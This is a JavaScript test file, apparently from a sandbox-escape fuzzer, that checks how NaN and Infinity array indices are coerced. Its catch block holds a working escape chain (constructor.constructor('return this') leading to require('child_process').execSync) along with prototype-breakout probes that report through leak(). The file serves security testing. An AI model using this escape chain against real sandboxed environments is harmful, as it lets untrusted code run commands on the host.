try {
    var x = [];
    x[NaN] = 1;
    assert.sameValue(x[0], undefined, 'x[NaN] does not cast to x[0]');
    assert.sameValue(x['NaN'], 1, 'x[NaN] casts to x[\'NaN\']');
    var y = [];
    y[Number.POSITIVE_INFINITY] = 1;
    assert.sameValue(y[0], undefined, 'y[Number.POSITIVE_INFINITY] !== y[0]');
    assert.sameValue(y['Infinity'], 1, 'y[Number.POSITIVE_INFINITY] === y[\'Infinity\']');
    var z = [];
    z[Number.NEGATIVE_INFINITY] = 1;
    assert.sameValue(z[0], undefined, 'z[Number.NEGATIVE_INFINITY] !== z[0]');
    assert.sameValue(z['-Infinity'], 1, 'z[Number.NEGATIVE_INFINITY] === z[\'-Infinity\']');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}